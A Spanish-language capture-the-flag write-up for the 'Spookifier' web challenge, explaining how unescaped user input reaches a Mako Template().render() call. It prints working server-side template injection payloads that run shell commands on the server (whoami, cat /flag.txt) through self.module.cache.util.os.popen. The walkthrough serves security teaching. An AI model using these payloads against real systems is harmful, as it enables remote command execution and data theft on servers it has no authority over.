
# 🎃 Spookifier — SSTI en Mako

## 📌 Resumen rápido

|Campo|Valor|
|---|---|
|Nombre|Spookifier|
|Fecha|21 Oct 2022|
|Autor|Xclow3n|
|Dificultad|Fácil|
|Vulnerabilidad|Server-Side Template Injection (SSTI) en la librería **Mako**|
|Objetivo|Conseguir RCE y leer `/flag.txt`|

---

## 🖥️ ¿Qué hace la app?

Es una web muy simple: hay un formulario donde escribes tu nombre (o cualquier texto) y la app te devuelve ese texto **transformado en 4 estilos de fuente "spooky"** (letras raras tipo Halloween).

Solo tiene una ruta: `/`, que recibe un parámetro por GET llamado `text`.

---

## 🔍 Analizando el código fuente

Como tenemos el código fuente, vemos el flujo completo:

**`routes.py`** — recibe el texto del usuario:

```python
@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html', output=converted)
    return render_template('index.html', output='')
```

**`util.py`** — procesa el texto:

```python
def spookify(text):
    converted_fonts = change_font(text_list=text)
    return generate_render(converted_fonts=converted_fonts)

def generate_render(converted_fonts):
    result = '''
    <tr><td>{0}</td></tr>
    <tr><td>{1}</td></tr>
    <tr><td>{2}</td></tr>
    <tr><td>{3}</td></tr>
    '''.format(*converted_fonts)
    return Template(result).render()
```

👉 **Aquí está el problema.** El texto del usuario pasa por `change_font()`, que simplemente reemplaza cada letra por su versión "decorada" según 4 diccionarios de fuentes. Si un carácter no existe en el diccionario (como `$`, `{`, `}`), **lo deja tal cual**.

Luego ese resultado (que puede seguir conteniendo `${...}`) se mete directo dentro de un `Template(result).render()` de **Mako**, sin sanitizar nada.

Esto significa: **todo lo que el usuario escriba que "sobreviva" al reemplazo de fuentes, se interpreta como código de plantilla Mako**.

---

## 💥 Explotando el SSTI

### Paso 1 — Confirmar la inyección

Mako usa `${ ... }` para evaluar expresiones Python dentro de la plantilla. Probamos:

```
${7*7}
```

Como parámetro:

```
http://target/?text=${7*7}
```

Si la página devuelve `49` en vez del texto literal, confirmamos que **sí hay SSTI**.

### Paso 2 — Buscar un payload de RCE

Mako no expone `os` directamente, pero se puede llegar a él a través de los objetos internos del propio motor de plantillas (`self.module`). Este truco está documentado en PayloadsAllTheThings para Mako.

Payload final (Remote Code Execution):

```
${self.module.cache.util.os.popen('whoami').read()}
```

Se manda como valor del parámetro `text`:

```
http://target/?text=${self.module.cache.util.os.popen('whoami').read()}
```

La app ejecuta el comando `whoami` en el servidor y nos devuelve el resultado en la respuesta HTML.

### Paso 3 — Leer la flag

Cambiamos el comando por uno que lea el archivo de la flag:

```
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

Y listo, la flag aparece en la respuesta. 🚩

---

## 🧠 ¿Por qué funciona esto?

- El input del usuario nunca se limpia ni se escapa antes de pasar por `Template(...).render()`.
- Mako, como muchos motores de plantillas, permite **ejecutar código Python arbitrario** dentro de `${ }` si no se usa en modo "sandboxed" o sin control de entrada.
- El diseño de "reemplazar letra por letra" del `change_font` **no filtra símbolos especiales** como `$`, `{`, `}`, que son justo la sintaxis que Mako necesita para evaluar expresiones.

---
## ✅ Payload final usado

```text
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

